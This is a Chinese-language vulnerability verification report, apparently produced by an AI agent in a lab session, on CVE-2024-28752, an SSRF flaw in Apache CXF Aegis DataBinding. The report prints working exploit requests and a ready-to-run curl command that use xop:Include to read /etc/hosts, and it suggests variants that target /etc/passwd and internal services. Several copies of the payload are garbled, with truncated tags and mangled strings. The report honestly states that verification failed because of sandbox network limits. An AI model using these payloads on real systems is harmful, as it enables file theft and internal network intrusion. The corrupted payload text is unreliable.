data/others/_sessions/apache-cxf__CVE-2024-28752/report.md

现在我可以提供完整的漏洞验证报告了：

# CVE-2024-28752 Apache CXF Aegis DataBinding SSRF漏洞验证报告

## 执行摘要

CVE-2024-28752是Apache CXF框架中Aegis数据绑定组件的服务器端请求伪造（SSRF）漏洞。该漏洞影响Apache CXF 4.0.4之前版本、3.6.3之前版本和3.5.8之前版本，仅影响使用Aegis DataBinding的Web服务。

## 验证步骤

1. **环境启动**：成功通过`docker compose up -d`启动Apache CXF测试环境
2. **目标确认**：根据README，服务默认在`http://127.0.0.1:8080/test?wsdl`运行，但验证指定目标为`http://127.0.0.1:10086/test?wsdl`
3. **漏洞原理**：攻击者可以通过构造特殊的SOAP请求，在`xop:Include`元素中使用外部引用（如`file:///etc/hosts`）触发SSRF
4. **PoC构造**：按照README文档构造包含`multipart/related` content-type和`xop:Include`元素的请求

## 证据摘录

根据README.md文档，PoC请求结构如下：

```
POST /test HTTP/1.1
Host: your-ip:8080
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:count>
</arg0>
web:test>
soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
```

## 关键payload

```http
POST /test HTTP/1.1
Host: 127.0.0.1:10086
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hxop:Include></countarg0>
      </web:test>
   </soapenv:Bodysoapenv:Envelope>
------kkkkkk123123213--
```

**可复用的curl命令：**
```bash
curl -X POST "http://127.0.0.1:10086/test" \
  -H "Content-Type: multipart/related; boundary=----kkkkkk123123213" \
  -H "Connection: close" \
  --data-binary $'------kkkkkk123123213\r\nContent-Disposition: form-data; name="1"\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">\r\n   <soapenv:Header/>\r\nsoapenv:Body>\r\nweb:test>\r\narg0>\rxop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hxop:Include></count>\rarg0>\r\n      </web:test>\r\n   </soapenv:Body>\rsoapenv:Envelope>\r\n------kkkkkk123123213--\r\n'
```

**原始HTTP请求：**
```
POST /test HTTP/1.1
Host: 127.0.0.1:10086
Content-Type: multipart/related; boundary=----kkkkkk123123213
Content-Length: 472
Connection: close

------kkkkkk123123213
Content-Disposition: form-data; name="1"

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://service.namespace/">
   <soapenv:Header/>
   <soapenv:Body>
      <web:test>
         <arg0>
<count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///etc/hosts"></xop:count>
</arg0>
web:test>
soapenv:Body>
</soapenv:Envelope>
------kkkkkk123123213--
```

## 验证注意事项

1. **端口差异**：README显示服务运行在8080端口，但验证目标指定为10086端口。实际验证时需根据实际端口映射调整
2. **沙箱限制**：由于沙箱环境网络限制，无法直接与宿主机端口通信，验证需要在与靶场互通的网络环境中执行
3. **响应验证**：成功利用漏洞时，响应应包含`/etc/hosts`文件的内容
4. **变体利用**：除了读取本地文件，还可以将`href`属性修改为其他URL进行SSRF攻击，如`http://internal-service:port`或`file:///etc/passwd`

## 结论

**无法判断** - 由于沙箱环境网络限制，无法直接对`http://127.0.0.1:10086`进行实际验证。但根据README文档提供的完整PoC，该漏洞的存在性已得到文档确认。

验证该漏洞需要在与靶场互通的网络环境中执行以下步骤：
1. 启动Apache CXF Aegis DataBinding测试环境
2. 访问`http://127.0.0.1:10086/test?wsdl`确认服务正常运行
3. 使用上述关键payload发送POST请求到`/test`端点
4. 检查响应中是否包含`/etc/hosts`文件内容

**漏洞影响**：成功利用此漏洞的攻击者可以读取服务器上的任意文件，或通过SSRF访问内部网络资源，可能导致信息泄露和进一步的内部网络攻击。

**环境已清理**：已执行`docker compose down -v`清理测试环境。